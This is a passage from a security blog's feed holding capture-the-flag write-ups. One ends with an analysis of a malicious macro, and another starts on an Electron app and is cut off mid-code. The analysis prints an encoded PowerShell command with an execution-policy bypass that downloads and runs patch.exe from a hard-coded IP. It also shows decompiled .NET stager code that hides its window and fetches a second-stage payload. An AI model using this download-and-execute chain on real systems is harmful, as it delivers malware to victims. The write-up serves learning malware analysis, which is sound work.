&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> File &lt;span style="color:#e6db74">&amp;#34;/home/vivescere/ctf/the-document-is-strange/test/converted.py&amp;#34;&lt;/span>, line 89, in &amp;lt;module&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LwvYeveWxaeE&lt;span style="color:#f92672">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> File &lt;span style="color:#e6db74">&amp;#34;/home/vivescere/ctf/the-document-is-strange/test/converted.py&amp;#34;&lt;/span>, line 53, in LwvYeveWxaeE
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> BotaCipUCROa &lt;span style="color:#f92672">=&lt;/span> Application.UserName
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>NameError: name &lt;span style="color:#e6db74">&amp;#39;Application&amp;#39;&lt;/span> is not defined
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now if we look a bit further up, at this point what&amp;rsquo;s being written to the file is already created. Let&amp;rsquo;s print it:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(MwIMnegwljrXk)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> BotaCipUCROa &lt;span style="color:#f92672">=&lt;/span> Application&lt;span style="color:#f92672">.&lt;/span>UserName
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ python converted.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>powershell.exe -exec bypass -enc JABQAHIAbwBjAE4AYQBtAGUAIAA9ACAAIgBwAGEAdABjAGgALgBlAHgAZQAiAA0ACgAkAFcAZQBiAEYAaQBsAGUAIAA9ACAAIgBoAHQAdABwADoALwAvADEANQAyAC4AMgAyADgALgAxADMAMwAuADYAOAAvACQAUAByAG8AYwBOAGEAbQBlACIADQAKACAADQAKACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAkAFcAZQBiAEYAaQBsAGUALAAiACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAJABQAHIAbwBjAE4AYQBtAGUAIgApAA0ACgBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAKAAiACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAJABQAHIAbwBjAE4AYQBtAGUAIgApAA&lt;span style="color:#f92672">==&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>An encoded powershell command! Let&amp;rsquo;s decode it:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ echo &lt;span style="color:#e6db74">&amp;#39;JABQAHIAbwBjAE4AYQBtAGUAIAA9ACAAIgBwAGEAdABjAGgALgBlAHgAZQAiAA0ACgAkAFcAZQBiAEYAaQBsAGUAIAA9ACAAIgBoAHQAdABwADoALwAvADEANQAyAC4AMgAyADgALgAxADMAMwAuADYAOAAvACQAUAByAG8AYwBOAGEAbQBlACIADQAKACAADQAKACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAkAFcAZQBiAEYAaQBsAGUALAAiACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAJABQAHIAbwBjAE4AYQBtAGUAIgApAA0ACgBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAKAAiACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAJABQAHIAbwBjAE4AYQBtAGUAIgApAA==&amp;#39;&lt;/span> | base64 -d
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ProcName &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;patch.exe&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$WebFile &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;http://152.228.133.68/&lt;/span>$ProcName&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>New-Object System.Net.WebClient&lt;span style="color:#f92672">)&lt;/span>.DownloadFile&lt;span style="color:#f92672">(&lt;/span>$WebFile,&lt;span style="color:#e6db74">&amp;#34;&lt;/span>$env&lt;span style="color:#e6db74">:APPDATA\$ProcName&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Start-Process &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>$env&lt;span style="color:#e6db74">:APPDATA\$ProcName&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>OK so a &lt;code>patch.exe&lt;/code> file is downloaded, and executed. Let&amp;rsquo;s take a look:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ wget http://152.228.133.68/patch.exe
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ file patch.exe
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>patch.exe: PE32 executable &lt;span style="color:#f92672">(&lt;/span>console&lt;span style="color:#f92672">)&lt;/span> Intel &lt;span style="color:#ae81ff">80386&lt;/span> Mono/.Net assembly, &lt;span style="color:#66d9ef">for&lt;/span> MS Windows
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>It&amp;rsquo;s a .NET program, we can use &lt;a href="https://github.com/icsharpcode/ILSpy">ILSpy&lt;/a> to analyze it. It only contains a bit of code:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cs" data-lang="cs">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// @&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">using&lt;/span> System;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">using&lt;/span> System.IO;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">using&lt;/span> System.Net;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">using&lt;/span> System.Runtime.InteropServices;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">using&lt;/span> System.Threading;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">internal&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e"> [DllImport(&amp;#34;kernel32.dll&amp;#34;, EntryPoint = &amp;#34;GetConsoleWindow&amp;#34;)]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">extern&lt;/span> IntPtr &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e"> [DllImport(&amp;#34;user32.dll&amp;#34;, EntryPoint = &amp;#34;ShowWindow&amp;#34;)]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">extern&lt;/span> &lt;span style="color:#66d9ef">bool&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span>(IntPtr &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span>, &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> Main(&lt;span style="color:#66d9ef">string&lt;/span>[] args)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span>(&lt;span style="color:#960050;background-color:#1e0010">@&lt;/span>(), &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Thread.Sleep(&lt;span style="color:#ae81ff">30000&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Console.WriteLine(&lt;span style="color:#e6db74">&amp;#34;http://152.228.133.68/staged_payload.txt&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> WebRequest webRequest = WebRequest.Create(&lt;span style="color:#e6db74">&amp;#34;http://152.228.133.68/staged_payload.txt&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> webRequest.Method = &lt;span style="color:#e6db74">&amp;#34;GET&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Console.WriteLine(&lt;span style="color:#66d9ef">new&lt;/span> StreamReader(webRequest.GetResponse().GetResponseStream()).ReadToEnd());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Let&amp;rsquo;s take a look at that payload:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ curl http://152.228.133.68/staged_payload.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>CYBERTF&lt;span style="color:#f92672">{&lt;/span>M4cr0_D0wnl0ad3r_1s_D0wn&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here we go, the flag is &lt;code>CYBERTF{M4cr0_D0wnl0ad3r_1s_D0wn}&lt;/code>.&lt;/p>
&lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/reverse/the-document-is-strange">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>Writeup Cyber Threat Force : Smasher</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-smasher/</link><pubDate>Sat, 10 Jul 2021 02:50:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-smasher/</guid><description>For this challenge, we were given two files:
smasher-1.0.0.AppImage smasher_Setup_1.0.0.exe I only looked at the AppImage one, since I&amp;rsquo;m running linux. Launching the program reveals an electron app:
We can simply use the dev tools to reveal the source code. Only one javascript file is there, login.js:
function Login() { var i = { _keyStr: &amp;#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&amp;#34;, encode: function(r) { var t, e, o, a, n, c, h = &amp;#34;&amp;#34;, d = 0; for (r = i.</description><content>&lt;p>For this challenge, we were given two files:&lt;/p>
&lt;ul>
&lt;li>&lt;code>smasher-1.0.0.AppImage&lt;/code>&lt;/li>
&lt;li>&lt;code>smasher_Setup_1.0.0.exe&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>I only looked at the AppImage one, since I&amp;rsquo;m running linux. Launching the program reveals an electron app:&lt;/p>
&lt;p>&lt;img src="https://nicolasb.fr/assets/cyber-threat-force/smasher.png" alt="The application">&lt;/p>
&lt;p>We can simply use the dev tools to reveal the source code. Only one javascript file is there, &lt;code>login.js&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">Login&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">_keyStr&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#e6db74">&amp;#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">encode&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span>(&lt;span style="color:#a6e22e">r&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">t&lt;/span>, &lt;span style="color:#a6e22e">e&lt;/span>, &lt;span style="color:#a6e22e">o&lt;/span>, &lt;span style="color:#a6e22e">a&lt;/span>, &lt;span style="color:#a6e22e">n&lt;/span>, &lt;span style="color:#a6e22e">c&lt;/span>, &lt;span style="color:#a6e22e">h&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>, &lt;span style="color:#a6e22e">d&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#a6e22e">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">i&lt;/span>.&lt;span style="color:#a6e22e">_utf8_encode&lt;/span>(&lt;span style="color:#a6e22e">r&lt;/span>); &lt;span style="color:#a6e22e">d&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">length&lt;/span>; )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#a6e22e">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">charCodeAt&lt;/span>(&lt;span style="color:#a6e22e">d&lt;/span>&lt;span style="color:#f92672">++&lt;/span>)) &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">c&lt;/span>) &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#f92672">|&lt;/span> (&lt;span style="color:#a6e22e">t&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">charCodeAt&lt;/span>(&lt;span style="color:#a6e22e">d&lt;/span>&lt;span style="color:#f92672">++&lt;/span>)) &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#ae81ff">15&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">t&lt;/span>) &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">|&lt;/span> (&lt;span style="color:#a6e22e">e&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">charCodeAt&lt;/span>(&lt;span style="color:#a6e22e">d&lt;/span>&lt;span style="color:#f92672">++&lt;/span>)) &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">63&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">e&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> isNaN(&lt;span style="color:#a6e22e">t&lt;/span>) &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#a6e22e">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">64&lt;/span> &lt;span style="color:#f92672">:&lt;/span> isNaN(&lt;span style="color:#a6e22e">e&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (&lt;span style="color:#a6e22e">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">64&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">h&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">h&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">_keyStr&lt;/span>.&lt;span style="color:#a6e22e">charAt&lt;/span>(&lt;span style="color:#a6e22e">o&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">_keyStr&lt;/span>.&lt;span style="color:#a6e22e">charAt&lt;/span>(&lt;span style="color:#a6e22e">a&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">_keyStr&lt;/span>.&lt;span style="color:#a6e22e">charAt&lt;/span>(&lt;span style="color:#a6e22e">n&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">_keyStr&lt;/span>.&lt;span style="color:#a6e22e">charAt&lt;/span>(&lt;span style="color:#a6e22e">c&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">h&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">decode&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span>(&lt;span style="color:#a6e22e">r&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">t&lt;/span>, &lt;span style="color:#a6e22e">e&lt;/span>, &lt;span style="color:#a6e22e">o&lt;/span>, &lt;span style="color:#a6e22e">a&lt;/span>, &lt;span style="color:#a6e22e">n&lt;/span>, &lt;span style="color:#a6e22e">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>, &lt;span style="color:#a6e22e">h&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#a6e22e">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">replace&lt;/span>(&lt;span style="color:#e6db74">/[^A-Za-z0-9\+\/\=]/g&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>); &lt;span style="color:#a6e22e">h&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">length&lt;/span>; )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">t&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">_keyStr&lt;/span>.&lt;span style="color:#a6e22e">indexOf&lt;/span>(&lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">charAt&lt;/span>(&lt;span style="color:#a6e22e">h&lt;/span>&lt;span style="color:#f92672">++&lt;/span>)) &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">|&lt;/span> (&lt;span style="color:#a6e22e">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">_keyStr&lt;/span>.&lt;span style="color:#a6e22e">indexOf&lt;/span>(&lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">charAt&lt;/span>(&lt;span style="color:#a6e22e">h&lt;/span>&lt;span style="color:#f92672">++&lt;/span>))) &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">e&lt;/span> &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#ae81ff">15&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">o&lt;/span>) &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#f92672">|&lt;/span> (&lt;span style="color:#a6e22e">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">_keyStr&lt;/span>.&lt;span style="color:#a6e22e">indexOf&lt;/span>(&lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">charAt&lt;/span>(&lt;span style="color:#a6e22e">h&lt;/span>&lt;span style="color:#f92672">++&lt;/span>))) &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">a&lt;/span>) &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> &lt;span style="color:#f92672">|&lt;/span> (&lt;span style="color:#a6e22e">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">_keyStr&lt;/span>.&lt;span style="color:#a6e22e">indexOf&lt;/span>(&lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">charAt&lt;/span>(&lt;span style="color:#a6e22e">h&lt;/span>&lt;span style="color:#f92672">++&lt;/span>))),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">c&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> String.&lt;span style="color:#a6e22e">fromCharCode&lt;/span>(&lt;span style="color:#a6e22e">t&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">64&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#a6e22e">a&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (&lt;span style="color:#a6e22e">c&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> String.&lt;span style="color:#a6e22e">fromCharCode&lt;/span>(&lt;span style="color:#a6e22e">e&lt;/span>)),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">64&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#a6e22e">n&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (&lt;span style="color:#a6e22e">c&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> String.&lt;span style="color:#a6e22e">fromCharCode&lt;/span>(&lt;span style="color:#a6e22e">o&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">i&lt;/span>.&lt;span style="color:#a6e22e">_utf8_decode&lt;/span>(&lt;span style="color:#a6e22e">c&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">_utf8_encode&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span>(&lt;span style="color:#a6e22e">r&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">replace&lt;/span>(&lt;span style="color:#e6db74">/\r\n/g&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;\n&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">t&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>, &lt;span style="color:#a6e22e">e&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; &lt;span style="color:#a6e22e">e&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">length&lt;/span>; &lt;span style="color:#a6e22e">e&lt;/span>&lt;span style="color:#f92672">++&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">charCodeAt&lt;/span>(&lt;span style="color:#a6e22e">e&lt;/span>);
